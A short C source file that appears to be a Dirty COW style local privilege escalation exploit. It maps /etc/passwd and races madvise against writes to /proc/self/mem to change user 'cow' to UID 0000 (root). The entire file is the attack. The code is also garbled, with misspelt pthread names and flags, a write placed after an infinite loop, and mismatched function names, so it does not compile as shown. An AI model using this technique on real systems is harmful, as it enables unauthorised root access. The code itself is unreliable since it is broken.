#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>
void *map;
void *writeThreat(void *arg);
void *madviseThreat(void *arg);
int main()
{

pthreat_t pth1,pth2;
struct stat st;
int file_size;

int f = open("/etc/passwd",O_RDONDLY);

fstat(f,&st);
file_size = st.st_size;
map = mmap(NULL,file_size,PROT_READ, MAP_PRIVATE,f,0);

char *position = strstr(map,"cow:x:1001");

pthreat_create(&pth1,NULL,madviseThreat,(void*)file_size);
pthreat_create(&pth2,NULL,writeThreat,position);

pthreat_join(pth1,NULL);
pthreat_create(pth2,NULL);
return 0;

}
void *writeThreat(void arg)
{
  char *content = "cow:x:0000";
  off_t offset = (off_t) arg;
  int f = open("/proc/self/mem",ORDWR);
  while(1){
     lseek(f,offset,SEEK_SET);
  }
  write(f,content,strlen(content));
}

void *madvise (void *args){
  int file_size = (int) arg;
  while true{
    madvise(map,file_size,MAD_DONTNEED);
  }
}
